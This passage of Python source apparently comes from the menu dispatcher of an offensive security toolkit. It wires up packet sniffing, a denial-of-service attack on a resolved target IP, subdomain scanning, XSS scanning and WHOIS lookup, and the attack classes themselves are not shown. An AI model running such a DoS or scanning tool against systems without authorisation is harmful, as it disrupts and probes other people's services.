        interfaces = info.getInterfaces()
        info.showInterfaces(interfaces)
        choose = int(input("\nPlease choose a interface: "))
        choosenInterface = interfaces[choose - 1]
        sniff = Sniff(choosenInterface)
        print("\n*******************************Sniff is started*********************************\n")
        sniff.listenPacket()

    def dosAttack(self, target):
        targetIp = socket.gethostbyname(target)
        dos = DOSAttack(targetIp)
        dos.start()

    def subDomainScan(self, target):

        subDomainScan = SubDomainScan(target)
        print("\nSub Domain Scan is Started.\n")
        subDomainScan.start()

    def xssScan(self, target):

        xss = XSSScanner(target)
        print("\nXss Scan is Started.\n")
        xss.scanXSS()

    def whois(self, domain):
        whoIs = WhoIsLookup(domain)
        print("\nWho is Lookup is started.\n")
        whoIs.query()

    def exit(self):
        print("Exiting...")
        sys.exit(1)


if __name__ == '__main__':
    main = Main()
    main.start()

